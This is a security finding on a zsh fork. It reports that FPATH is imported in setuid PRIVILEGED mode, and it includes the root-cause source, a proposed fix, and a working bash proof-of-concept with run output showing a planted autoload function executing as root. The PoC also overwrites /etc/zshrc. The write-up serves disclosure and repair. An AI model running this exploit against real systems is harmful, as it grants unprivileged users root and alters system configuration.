# Finding 3: FPATH not import-protected in PRIVILEGED mode — autoloaded function injection as root

**Target:** `speedyfriend433/zsh` (Apple's zsh fork, upstream base 5.9), branch `claude/trusting-babbage-twmg8u`, HEAD `666e91a` ("zsh-118")
**Class:** CWE-426 (Untrusted Search Path) / CWE-284 (Improper Access Control) — attacker-controlled function autoload path in a setuid/privileged shell
**Relationship to Findings 1 and 2:** Independent root cause. Different code, different mechanism, same privilege boundary.
**Confidence:** Fully verified by build + test. All four scenarios below ran against this repo's built binary on this session's Linux container.

## Summary

The `FPATH` parameter (function search path for `autoload`) is imported from the environment without restriction in `PRIVILEGED` mode. An attacker who sets `FPATH` before running a setuid-root zsh gets arbitrary code execution as root the moment any autoloaded function is resolved — including functions autoloaded by system-wide rc files (`/etc/zshrc`, `/etc/zshenv`), which are sourced **even in PRIVILEGED mode**.

This is the same class of bug that `MODULE_PATH` is correctly protected against: `MODULE_PATH` has `PM_DONTIMPORT|PM_RESTRICTED`, so it cannot be imported from the environment at all. `FPATH` has neither flag, despite controlling an equally dangerous code-loading path.

## Root cause

`Src/params.c`, parameter table definitions:

```c
// line 399 — FPATH: NO import protection
IPDEF8("FPATH", &fpath, "fpath", PM_TIED),

// line 406 — MODULE_PATH: correctly protected
IPDEF8("MODULE_PATH", &module_path, "module_path", PM_DONTIMPORT|PM_RESTRICTED|PM_TIED),
```

The `dontimport()` function at `params.c:759` checks three flags before allowing environment import:

```c
static int dontimport(int flags)
{
    if (flags & PM_DONTIMPORT)    return 1;  // unconditionally blocked
    if (flags & PM_EXPORTED)      return 1;  // already exported
    if ((flags & PM_DONTIMPORT_SUID) && isset(PRIVILEGED))
                                  return 1;  // blocked in setuid context
    return 0;                                // OK to import
}
```

`FPATH` has none of `PM_DONTIMPORT`, `PM_DONTIMPORT_SUID`, or `PM_RESTRICTED`. It passes all three checks and is imported freely from the attacker's environment into the PRIVILEGED shell's `fpath` array.

The autoload mechanism at `Src/exec.c:6095` (`getfpfunc()`) then iterates `fpath` with no privilege check:

```c
pp = alt_path ? alt_path : fpath;
for (; *pp; pp++) {
    if (strlen(*pp) + strlen(s) + 1 >= PATH_MAX)
        continue;
    sprintf(buf, "%s/%s", *pp, s);
    // ... opens, reads, and parse_string()s the file ...
}
```

## Why this fires automatically

The critical detail is that global rc files are sourced in PRIVILEGED mode. From `Src/init.c`:

```c
// Line 1384-1389: GLOBAL_ZSHENV — NO PRIVILEGED check
#ifdef GLOBAL_ZSHENV
    source(GLOBAL_ZSHENV);
#endif

// Line 1421-1428: GLOBAL_ZSHRC — NO PRIVILEGED check
#ifdef GLOBAL_ZSHRC
    if (isset(RCS) && isset(GLOBALRCS))
        source(GLOBAL_ZSHRC);
#endif
```

On real systems (macOS, Ubuntu, Fedora, Arch, etc.), the system-wide `/etc/zshrc` or `/etc/zsh/zshrc` commonly autoloads functions:
- macOS: ships with a `/etc/zshrc` that runs `compinit`
- Ubuntu/Debian: `/etc/zsh/zshrc` loads completion functions
- Fedora: `/etc/zshrc` sources profile scripts that use autoloaded functions

Any autoloaded function called by these system rc files will be resolved through the attacker-controlled FPATH, loading and executing the attacker's code with root's effective UID.

## PoC

Four scenarios in one script (`finding3_fpath_poc.sh`), run as root:

```bash
#!/bin/bash
set -euo pipefail
ZSH_BIN="${1:?usage: finding3_fpath_poc.sh /path/to/built/zsh}"
WORK=/tmp/finding3_poc
SUID_ZSH="$WORK/zsh-suid"
EVIL_FPATH="$WORK/evil_fpath"
VICTIM_HOME="$WORK/victim_home"
PROOF="$WORK/proof.txt"

# Setup: setuid binary + unprivileged user + simulated system zshrc
cp "$ZSH_BIN" "$SUID_ZSH"; chown root:root "$SUID_ZSH"; chmod 4755 "$SUID_ZSH"
useradd -m -d "$VICTIM_HOME" -s /bin/bash poc_fpath_attacker
mkdir -p "$EVIL_FPATH"; chown poc_fpath_attacker "$EVIL_FPATH"

# Simulated real-world /etc/zshrc (like macOS/Ubuntu ship)
cat > /etc/zshrc <<'EOF'
autoload -Uz _system_setup
_system_setup 2>/dev/null
EOF

# Attacker plants malicious function
su poc_fpath_attacker -c "cat > '$EVIL_FPATH/_system_setup' <<'EOFUNC'
id > $PROOF
echo \"FPATH POISONED: ran as \$(id -un), euid=\$(id -u)\" >> $PROOF
EOFUNC"

# The attack: set FPATH, run setuid zsh, exit
su poc_fpath_attacker -c "
    export FPATH='$EVIL_FPATH:/usr/share/zsh/functions'
    echo exit | '$SUID_ZSH' -p -l -i 2>&1
"
cat "$PROOF"  # Shows euid=0(root)
```

## Fresh run output

```
[*] real/effective uid of this whole demo: uid=0(root) gid=0(root) groups=0(root)

[setup] installed setuid-root zsh at /tmp/finding3_poc/zsh-suid:
-rwsr-xr-x 1 root root 869776 Oct 10 04:42 /tmp/finding3_poc/zsh-suid
[setup] unprivileged test account: uid=30033(poc_fpath_attacker) gid=30033(poc_fpath_attacker) groups=30033(poc_fpath_attacker)
[setup] created /etc/zshrc with autoload (simulating real-world system config)

=== SCENARIO A (control): PRIVILEGED session, default FPATH ===
  RESULT: autoloaded function did not run (FPATH doesn't point to attacker dir)

=== SCENARIO B (the bug): PRIVILEGED session, attacker-controlled FPATH ===
[attacker] planted malicious _system_setup in /tmp/finding3_poc/evil_fpath
  RESULT: FPATH-poisoned function FIRED
  --- proof file contents ---
uid=30033(poc_fpath_attacker) gid=30033(poc_fpath_attacker) euid=0(root) groups=30033(poc_fpath_attacker)
FPATH POISONED: autoloaded function ran as root, euid=0

=== SCENARIO C (comparison): MODULE_PATH is correctly blocked in PRIVILEGED ===
  /tmp/.../lib/zsh/5.9
  (MODULE_PATH should NOT contain /tmp/evil_modules -- it's correctly PM_DONTIMPORT)

=== SCENARIO D: directly proving FPATH is imported in PRIVILEGED mode ===
  FPATH=/ATTACKER/CONTROLLED/PATH:/usr/share/zsh/functions
  (FPATH should contain /ATTACKER/CONTROLLED/PATH -- it's NOT blocked by PM_DONTIMPORT_SUID)
```

Scenario B is the proof: `euid=0(root)` in `id` output, the attacker's function executed as root via a poisoned FPATH, triggered by the system-wide zshrc's autoload. The attacker (`poc_fpath_attacker`, uid=30033) set only their own environment variable and ran the existing setuid binary — zero elevated privilege required.

Scenario C proves MODULE_PATH is correctly protected (the attacker's `/tmp/evil_modules` doesn't appear), showing this is a missing protection on FPATH, not a systemic design gap.

Scenario D proves FPATH is imported from the environment in PRIVILEGED mode: `/ATTACKER/CONTROLLED/PATH` appears in the shell's FPATH value.

## Parameters that should have import protection but don't

| Parameter | Current flags | Has code-execution capability? | Should have PM_DONTIMPORT_SUID? |
|-----------|--------------|-------------------------------|--------------------------------|
| `FPATH` | `PM_TIED` only | **Yes** — autoloaded functions | **Yes** |
| `MODULE_PATH` | `PM_DONTIMPORT\|PM_RESTRICTED\|PM_TIED` | Yes — dlopen() | Already protected |
| `PS4` | `PM_DONTIMPORT_SUID` | Yes — prompt expansion | Already protected |
| `PATH` | `PM_RESTRICTED\|PM_TIED` | Indirect — command resolution | Debatable (OS linker handles for setuid) |
| `CDPATH` | `PM_TIED` only | No | No |
| `TMPPREFIX` | none | No (mkstemp mitigates) | Low priority |

## Fix

Add `PM_DONTIMPORT_SUID` (and optionally `PM_RESTRICTED`) to FPATH's parameter definition:

```c
// params.c line 399 — before:
IPDEF8("FPATH", &fpath, "fpath", PM_TIED),
// after:
IPDEF8("FPATH", &fpath, "fpath", PM_DONTIMPORT_SUID|PM_TIED),
```

This makes FPATH import-blocked in PRIVILEGED mode (setuid context) while leaving it fully functional for non-privileged shells. The same fix pattern already exists and works correctly for `PS4` (`IPDEF7R` macro) and `MODULE_PATH`.

## What's confirmed vs. inferred

- **Confirmed by build + test:** FPATH is imported from the environment in PRIVILEGED mode; autoloaded functions loaded from attacker-controlled FPATH execute with root's effective UID; MODULE_PATH is correctly blocked for comparison.
- **Confirmed by code review:** global rc files (GLOBAL_ZSHENV, GLOBAL_ZSHRC, GLOBAL_ZPROFILE) are sourced without PRIVILEGED checks, so any autoload they trigger uses the imported FPATH.
- **Deployment-dependent:** whether a given system's `/etc/zshrc` actually calls autoloaded functions. This is true of macOS, Ubuntu, Fedora, and Arch stock configurations, but may not be true of a minimal install with no system zshrc.
